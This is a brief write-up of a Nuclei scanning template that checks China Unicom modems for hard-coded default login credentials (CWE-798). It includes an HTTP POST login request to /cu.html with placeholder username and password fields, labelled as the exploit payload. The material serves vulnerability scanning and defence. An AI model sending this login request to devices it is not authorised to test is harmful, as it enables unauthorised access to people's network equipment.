# Nuclei Template: China Unicom Modem Default Login
**Template ID:** chinaunicom-default-login
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** High
**CWE:** CWE-798
**Source:** Nuclei Template (`chinaunicom-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Default login credentials were discovered for a China Unicom modem.

## Steps to reproduce / Exploit Payload
```http
POST /cu.html HTTP/1.1
Host: {{Hostname}}

frashnum=&action=login&Frm_Logintoken=1&Username={{username}}&Password={{password}}&Username=&Password=
```

